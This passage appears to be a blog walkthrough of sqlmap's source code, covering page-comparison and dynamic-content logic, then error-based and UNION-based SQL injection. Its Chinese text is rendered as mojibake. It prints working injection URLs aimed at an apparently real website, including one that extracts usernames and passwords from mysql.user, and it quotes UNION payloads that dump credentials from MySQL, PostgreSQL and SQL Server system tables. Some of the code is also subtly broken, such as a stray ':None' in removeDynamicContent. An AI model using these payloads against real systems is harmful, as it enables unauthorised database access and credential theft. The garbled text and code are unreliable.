seqMatcher.set_seq1(kb.pageTemplate)<br><br>    <span class="hljs-keyword">if</span> page:<br>        <span class="hljs-comment"># String to match in page when the query is valid</span><br>        <span class="hljs-comment">#a.1 å¦‚æœå‡ºç°æŒ‡å®šå­—ç¬¦ä¸²ï¼Œè¿”å›True</span><br>        <span class="hljs-keyword">if</span> conf.string:<br>            condition = conf.string <span class="hljs-keyword">in</span> page<br>            <span class="hljs-keyword">return</span> condition <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> getRatioValue <span class="hljs-keyword">else</span> (MAX_RATIO <span class="hljs-keyword">if</span> condition <span class="hljs-keyword">else</span> MIN_RATIO)<br><br>        <span class="hljs-comment"># Regular expression to match in page when the query is valid</span><br>        <span class="hljs-comment"># a.2 å¦‚æœå‡ºç°æŒ‡å®šæ­£åˆ™è¡¨è¾¾å¼ï¼Œè¿”å›Ture</span><br>        <span class="hljs-keyword">if</span> conf.regexp:<br>            condition = re.search(conf.regexp, page, re.I | re.M) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br>            <span class="hljs-keyword">return</span> condition <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> getRatioValue <span class="hljs-keyword">else</span> (MAX_RATIO <span class="hljs-keyword">if</span> condition <span class="hljs-keyword">else</span> MIN_RATIO)<br><br>        <span class="hljs-comment"># In case of an DBMS error page return None</span><br>        <span class="hljs-keyword">if</span> kb.errorIsNone <span class="hljs-keyword">and</span> (wasLastRequestDBMSError() <span class="hljs-keyword">or</span> wasLastRequestHTTPError()):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-comment"># Dynamic content lines to be excluded before comparison</span><br>        <span class="hljs-comment"># a.4 æ¯”è¾ƒå‰å…ˆå°†ä¸¤ä¸ªé¡µé¢çš„åŠ¨æ€å†…å®¹ç§»é™¤</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> kb.nullConnection:<br>            page = removeDynamicContent(page)<br>            seqMatcher.set_seq1(removeDynamicContent(kb.pageTemplate))<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> pageLength:<br>            pageLength = <span class="hljs-built_in">len</span>(page)<br><br>    <span class="hljs-comment"># è¿æ¥å‘ç”Ÿé”™è¯¯</span><br>    <span class="hljs-keyword">if</span> kb.nullConnection <span class="hljs-keyword">and</span> pageLength:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> seqMatcher.a:<br>            errMsg = <span class="hljs-string">&quot;problem occured while retrieving original page content &quot;</span><br>            errMsg += <span class="hljs-string">&quot;which prevents sqlmap from continuation. please rerun, &quot;</span><br>            errMsg += <span class="hljs-string">&quot;and if problem persists please turn off optimization switches&quot;</span><br>            <span class="hljs-keyword">raise</span> sqlmapNoneDataException, errMsg<br><br>        ratio = <span class="hljs-number">1.</span> * pageLength / <span class="hljs-built_in">len</span>(seqMatcher.a)<br><br>        <span class="hljs-keyword">if</span> ratio &gt; <span class="hljs-number">1.</span>:<br>            ratio = <span class="hljs-number">1.</span> / ratio<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># æ­£å¸¸è¿æ¥æƒ…å†µ, åˆ¤æ–­æ˜¯å¦ä½¿ç”¨textOnlyå‘½ä»¤è¡Œå‚æ•°</span><br>        seqMatcher.set_seq1(getFilteredPageContent(seqMatcher.a, <span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> conf.textOnly <span class="hljs-keyword">else</span> seqMatcher.a)<br>        seqMatcher.set_seq2(getFilteredPageContent(page, <span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> conf.textOnly <span class="hljs-keyword">else</span> page)<br>        <span class="hljs-comment"># float 3 digits</span><br>        ratio = <span class="hljs-built_in">round</span>(seqMatcher.quick_ratio(), <span class="hljs-number">3</span>)<br>        logger.debug(<span class="hljs-string">&#x27;ratio: %s&#x27;</span> % ratio)<br><br>    <span class="hljs-comment"># If the url is stable and we did not set yet the match ratio and the</span><br>    <span class="hljs-comment"># current injected value changes the url page content</span><br>    <span class="hljs-keyword">if</span> kb.matchRatio <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> kb.pageStable <span class="hljs-keyword">and</span> ratio &gt;= LOWER_RATIO_BOUND <span class="hljs-keyword">and</span> ratio &lt;= UPPER_RATIO_BOUND:<br>            kb.matchRatio = ratio<br>            logger.debug(<span class="hljs-string">&quot;setting match ratio for current parameter to %.3f&quot;</span> % kb.matchRatio)<br><br>        <span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> kb.pageStable:<br>            <span class="hljs-comment"># CONSTANT_RATIO = 0.900</span><br>            kb.matchRatio = CONSTANT_RATIO<br>            logger.debug(<span class="hljs-string">&quot;setting match ratio for current parameter to default value 0.900&quot;</span>)<br><br>    <span class="hljs-comment"># If it has been requested to return the ratio and not a comparison</span><br>    <span class="hljs-comment"># response</span><br>    <span class="hljs-keyword">if</span> getRatioValue:<br>        <span class="hljs-keyword">return</span> ratio<br>    <br>    <span class="hljs-comment"># ratio &gt; 0.98, è®¤ä¸ºä¸¤ä¸ªé¡µé¢ä¸€æ ·</span><br>    <span class="hljs-keyword">elif</span> ratio &gt; UPPER_RATIO_BOUND:  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">elif</span> kb.matchRatio <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># url ä¸ç¨³å®š</span><br>        <span class="hljs-keyword">if</span> kb.matchRatio == CONSTANT_RATIO:<br>            <span class="hljs-keyword">return</span> ratio &gt; kb.matchRatio<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># DIFF_TOLERANCE = 0.05  magic number</span><br>            <span class="hljs-keyword">return</span> (ratio - kb.matchRatio) &gt; DIFF_TOLERANCE<br><br><br>ç§»é™¤åŠ¨æ€å†…å®¹<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">removeDynamicContent</span>(<span class="hljs-params">page</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Removing dynamic content from supplied page basing removal on</span><br><span class="hljs-string">    precalculated dynamic markings</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">if</span> page:<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> kb.dynamicMarkings:<br>            prefix, suffix = item<br><br>            <span class="hljs-keyword">if</span> prefix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> suffix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">elif</span> prefix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<span class="hljs-literal">None</span><br>                page = getCompiledRegex(<span class="hljs-string">&#x27;(?s)^.+%s&#x27;</span> % suffix).sub(suffix, page)<br>            <span class="hljs-keyword">elif</span> suffix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                page = getCompiledRegex(<span class="hljs-string">&#x27;(?s)%s.+$&#x27;</span> % prefix).sub(prefix, page)<br>            <span class="hljs-keyword">else</span>:<br>                page = getCompiledRegex(<span class="hljs-string">&#x27;(?s)%s.+%s&#x27;</span> % (prefix, suffix)).sub(<span class="hljs-string">&#x27;%s%s&#x27;</span> % (prefix, suffix), page)<br><br>    <span class="hljs-keyword">return</span> page<br><br><span class="hljs-comment"># æŸ¥æ‰¾åŠ¨æ€å†…å®¹</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">findDynamicContent</span>(<span class="hljs-params">firstPage, secondPage</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    This function checks if the provided pages have dynamic content. If they</span><br><span class="hljs-string">    are dynamic, proper markings will be made</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    infoMsg = <span class="hljs-string">&quot;searching for dynamic content&quot;</span><br>    logger.info(infoMsg)<br><br>    <span class="hljs-comment"># è¿”å›åŒ¹é…çš„å†…å®¹</span><br>    blocks = SequenceMatcher(<span class="hljs-literal">None</span>, firstPage, secondPage).get_matching_blocks()<br>    kb.dynamicMarkings = []<br><br>    <span class="hljs-comment"># Removing too small matching blocks</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(blocks):<br>        block = blocks[i]<br>        (_, _, length) = block<br><br><span class="hljs-comment"># DYNAMICITY_MARK_LENGTH = 32</span><br>        <span class="hljs-keyword">if</span> length &lt;= DYNAMICITY_MARK_LENGTH:<br>            blocks.remove(block)<br><br>        <span class="hljs-keyword">else</span>:<br>            i += <span class="hljs-number">1</span><br><br>    <span class="hljs-comment"># Making of dynamic markings based on prefix/suffix principle</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(blocks) &gt; <span class="hljs-number">0</span>:<br><br><span class="hljs-comment"># åœ¨blocksçš„å‰åæ·»åŠ None</span><br>        blocks.insert(<span class="hljs-number">0</span>, <span class="hljs-literal">None</span>)<br>        blocks.append(<span class="hljs-literal">None</span>)<br><br><span class="hljs-comment"># </span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(blocks) - <span class="hljs-number">1</span>):<br>            prefix = firstPage[blocks[i][<span class="hljs-number">0</span>]:blocks[i][<span class="hljs-number">0</span>] + blocks[i][<span class="hljs-number">2</span>]] <span class="hljs-keyword">if</span> blocks[i] <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>            suffix = firstPage[blocks[i + <span class="hljs-number">1</span>][<span class="hljs-number">0</span>]:blocks[i + <span class="hljs-number">1</span>][<span class="hljs-number">0</span>] + blocks[i + <span class="hljs-number">1</span>][<span class="hljs-number">2</span>]] <span class="hljs-keyword">if</span> blocks[i + <span class="hljs-number">1</span>] <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br><br>            <span class="hljs-keyword">if</span> prefix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> blocks[i + <span class="hljs-number">1</span>][<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> suffix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> (blocks[i][<span class="hljs-number">0</span>] + blocks[i][<span class="hljs-number">2</span>] &gt;= <span class="hljs-built_in">len</span>(firstPage)):<br>                <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-comment"># å»æ‰å­—ç¬¦ä¸²å¤´å’Œå°¾çš„å­—æ¯å’Œæ•°å­—</span><br>            prefix = trimAlphaNum(prefix)<br>            suffix = trimAlphaNum(suffix)<br><br>            kb.dynamicMarkings.append((re.escape(prefix[-DYNAMICITY_MARK_LENGTH/<span class="hljs-number">2</span>:]) <span class="hljs-keyword">if</span> prefix <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>, re.escape(suffix[:DYNAMICITY_MARK_LENGTH/<span class="hljs-number">2</span>]) <span class="hljs-keyword">if</span> suffix <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>))<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(kb.dynamicMarkings) &gt; <span class="hljs-number">0</span>:<br>        infoMsg = <span class="hljs-string">&quot;dynamic content marked for removal (%d region%s)&quot;</span> % (<span class="hljs-built_in">len</span>(kb.dynamicMarkings), <span class="hljs-string">&#x27;s&#x27;</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(kb.dynamicMarkings) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span>)<br>        logger.info(infoMsg)<br></code></pre></td></tr></table></figure><h3 id="grep-æ­£åˆ™è¡¨è¾¾å¼-ï¼Œ-error-based-SQL-injection-å¯ä»¥æ£€æŸ¥"><a href="#grep-æ­£åˆ™è¡¨è¾¾å¼-ï¼Œ-error-based-SQL-injection-å¯ä»¥æ£€æŸ¥" class="headerlink" title="grep(æ­£åˆ™è¡¨è¾¾å¼)ï¼Œ error-based SQL injection, å¯ä»¥æ£€æŸ¥"></a>grep(æ­£åˆ™è¡¨è¾¾å¼)ï¼Œ error-based SQL injection, å¯ä»¥æ£€æŸ¥</h3><p>MS SQL serverï¼Œ Oracleï¼Œ Mysqlç­‰ï¼Œä½¿ç”¨çš„è¯­å¥ï¼Œä½¿ç”¨éšæœºå­—ç¬¦ä¸²æŸ¥è¯¢ï¼Œå¦‚æœè¿”å›ç»“æœçš„bodyï¼Œæˆ–è€…å¤´éƒ¨ä¿¡æ¯ä¸­åŒ…å«æˆ‘ä»¬æ„é€ çš„éšæœºå­—ç¬¦ä¸²ï¼Œåˆ™è®¤ä¸ºå­˜åœ¨æ¼æ´.å…·ä½“æ•°æ®å¯ä»¥ä½¿ç”¨sqlmap, payloads.xmlï¼Œä¾‹å­:</p><h4 id="MySQL-5-0-AND-error-based-WHERE-or-HAVING-clause"><a href="#MySQL-5-0-AND-error-based-WHERE-or-HAVING-clause" class="headerlink" title="MySQL &gt;&#x3D; 5.0 AND error-based - WHERE or HAVING clause"></a>MySQL &gt;&#x3D; 5.0 AND error-based - WHERE or HAVING clause</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://to.goojje.com/qunba.php?ac=thread_qb&amp;tid=<span class="hljs-number">9136</span>%<span class="hljs-number">20</span>AND%<span class="hljs-number">20</span>(SELECT%<span class="hljs-number">209066</span>%<span class="hljs-number">20</span>FROM(SELECT%<span class="hljs-number">20</span>COUNT(*),CONCAT(CHAR(<span class="hljs-number">58</span>,<span class="hljs-number">106</span>,<span class="hljs-number">108</span>,<span class="hljs-number">98</span>,<span class="hljs-number">58</span>),(MID((IFNULL(CAST(VERSION()%<span class="hljs-number">20</span>AS%<span class="hljs-number">20</span>CHAR),CHAR(<span class="hljs-number">32</span>))),<span class="hljs-number">1</span>,<span class="hljs-number">50</span>)),CHAR(<span class="hljs-number">58</span>,<span class="hljs-number">108</span>,<span class="hljs-number">112</span>,<span class="hljs-number">108</span>,<span class="hljs-number">58</span>),FLOOR(RAND(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x%<span class="hljs-number">20</span>FROM%<span class="hljs-number">20</span>information_schema.tables%<span class="hljs-number">20</span>GROUP%<span class="hljs-number">20</span>BY%<span class="hljs-number">20</span>x)a)<br></code></pre></td></tr></table></figure><p>urldecode åï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-keyword">to</span>.goojje.com/qunba.php?ac=thread_qb&amp;tid=<span class="hljs-number">9136</span> <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">9066</span> <span class="hljs-keyword">FROM</span>(<span class="hljs-keyword">SELECT</span> COUNT(*),CONCAT(<span class="hljs-type">CHAR</span>(<span class="hljs-number">58</span>,<span class="hljs-number">106</span>,<span class="hljs-number">108</span>,<span class="hljs-number">98</span>,<span class="hljs-number">58</span>),(MID((IFNULL(CAST(VERSION() <span class="hljs-keyword">AS</span> <span class="hljs-type">CHAR</span>),<span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>))),<span class="hljs-number">1</span>,<span class="hljs-number">50</span>)),<span class="hljs-type">CHAR</span>(<span class="hljs-number">58</span>,<span class="hljs-number">108</span>,<span class="hljs-number">112</span>,<span class="hljs-number">108</span>,<span class="hljs-number">58</span>),FLOOR(RAND(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">FROM</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> x)a)<br></code></pre></td></tr></table></figure><ul><li>CONCAT å­—ç¬¦ä¸²è¿æ¥</li><li>IFNULL åˆ¤æ–­æ˜¯å¦ä¸ºç©º</li><li>CAST å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºä¸åŒçš„å­—ç¬¦é›†</li><li>MID  å­—ç¬¦ä¸²æˆªå– MID(string, position[, length])</li><li>CHAR(58,106,108,98,58)  &#x3D;&gt; :bjl:</li><li>CHAR(58,108,112,108,58) &#x3D;&gt; :lpl:</li></ul><p>åˆ©ç”¨çš„Mysqlçš„ä¸€ä¸ªç‰¹æ€§ï¼Œ<a href="http://bugs.mysql.com/bug.php?id=32249">http://bugs.mysql.com/bug.php?id=32249</a></p><h4 id="Microsoft-SQL-Server-Sybase-AND-error-based-WHERE-or-HAVING-clause"><a href="#Microsoft-SQL-Server-Sybase-AND-error-based-WHERE-or-HAVING-clause" class="headerlink" title="Microsoft SQL Server&#x2F;Sybase AND error-based - WHERE or HAVING clause"></a>Microsoft SQL Server&#x2F;Sybase AND error-based - WHERE or HAVING clause</h4><p>è¿™éƒ¨åˆ†æ²¡æœ‰è®°å½•ã€‚</p><h4 id="PostgreSQL-AND-error-based-WHERE-or-HAVING-clause"><a href="#PostgreSQL-AND-error-based-WHERE-or-HAVING-clause" class="headerlink" title="PostgreSQL AND error-based - WHERE or HAVING clause"></a>PostgreSQL AND error-based - WHERE or HAVING clause</h4><p>è¿™éƒ¨åˆ†æ²¡æœ‰è®°å½•ã€‚</p><h4 id="Oracle-AND-error-based-WHERE-or-HAVING-clause-XMLType"><a href="#Oracle-AND-error-based-WHERE-or-HAVING-clause-XMLType" class="headerlink" title="Oracle AND error-based - WHERE or HAVING clause (XMLType)"></a>Oracle AND error-based - WHERE or HAVING clause (XMLType)</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-keyword">to</span>.goojje.com/qunba.php?ac=thread_qb&amp;tid=<span class="hljs-number">9136</span> <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">6531</span> <span class="hljs-keyword">FROM</span>(<span class="hljs-keyword">SELECT</span> COUNT(*),CONCAT(<span class="hljs-type">CHAR</span>(<span class="hljs-number">58</span>,<span class="hljs-number">121</span>,<span class="hljs-number">121</span>,<span class="hljs-number">98</span>,<span class="hljs-number">58</span>),(<span class="hljs-keyword">SELECT</span> MID(IFNULL(CAST(concat(<span class="hljs-keyword">user</span>,<span class="hljs-type">char</span>(<span class="hljs-number">58</span>),<span class="hljs-keyword">password</span>) <span class="hljs-keyword">AS</span> <span class="hljs-type">CHAR</span>), <span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">50</span>) <span class="hljs-keyword">FROM</span> mysql.<span class="hljs-keyword">user</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-type">CHAR</span>(<span class="hljs-number">58</span>,<span class="hljs-number">106</span>,<span class="hljs-number">116</span>,<span class="hljs-number">113</span>,<span class="hljs-number">58</span>),FLOOR(RAND(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> x)a)<br></code></pre></td></tr></table></figure><h3 id="unionTest-å‡½æ•°ï¼ŒUNION-query-inband-SQL-injection"><a href="#unionTest-å‡½æ•°ï¼ŒUNION-query-inband-SQL-injection" class="headerlink" title="unionTest() å‡½æ•°ï¼ŒUNION query (inband) SQL injection"></a>unionTest() å‡½æ•°ï¼ŒUNION query (inband) SQL injection</h3><p>(1) è®¾ç½®union ä½¿ç”¨çš„å­—ç¬¦å’Œæ³¨é‡Š<br>(2) åˆ¤æ–­unionæŸ¥è¯¢çš„åˆ—æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">forgeInbandQuery</span>(<span class="hljs-params">self, query, position, count, comment, prefix, suffix, char, multipleUnions=<span class="hljs-literal">None</span>, limited=<span class="hljs-literal">False</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Take in input an query (pseudo query) string and return its</span><br><span class="hljs-string">    processed UNION ALL SELECT query.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Examples:</span><br><span class="hljs-string"></span><br><span class="hljs-string">    MySQL input:  CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)) FROM mysql.user</span><br><span class="hljs-string">    MySQL output:  UNION ALL SELECT NULL, CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)), NULL FROM mysql.user-- AND 7488=7488</span><br><span class="hljs-string"></span><br><span class="hljs-string">    PostgreSQL input:  (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)) FROM pg_shadow</span><br><span class="hljs-string">    PostgreSQL output:  UNION ALL SELECT NULL, (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)), NULL FROM pg_shadow-- AND 7133=713</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Oracle input:  (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))</span><br><span class="hljs-string">    Oracle output:  UNION ALL SELECT NULL, (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)), NULL FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))-- AND 6738=6738</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Microsoft SQL Server input:  (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)) FROM master..sysxlogins</span><br><span class="hljs-string">    Microsoft SQL Server output:  UNION ALL SELECT NULL, (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)), NULL FROM master..sysxlogins-- AND 3254=3254</span><br><span class="hljs-string"></span><br><span class="hljs-string">    @param query: it is a processed query string unescaped to be</span><br><span class="hljs-string">    forged within an UNION ALL SELECT statement</span><br><span class="hljs-string">    @type query: C&#123;str&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    @param position: it is the NULL position where it is possible</span><br><span class="hljs-string">    to inject the query</span><br><span class="hljs-string">    @type position: C&#123;int&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    @return: UNION ALL SELECT query string forged</span><br><span class="hljs-string">    @rtype: C&#123;str&#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">if</span> query.startswith(<span class="hljs-string">&quot;SELECT &quot;</span>):<br>        query = query[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;SELECT &quot;</span>):]<br><br>    inbandQuery = self.prefixQuery(<span class="hljs-string">&quot;UNION ALL SELECT &quot;</span>, prefix=prefix)<br><br>    <span class="hljs-keyword">if</span> limited:<br>        inbandQuery += <span class="hljs-string">&quot;,&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: char <span class="hljs-keyword">if</span> x != position <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;(SELECT %s)&#x27;</span> % query, xrange(<span class="hljs-number">0</span>, count)))<br>        inbandQuery += FROM_TABLE.get(Backend.getIdentifiedDbms(), <span class="hljs-string">&quot;&quot;</span>)<br>        inbandQuery = 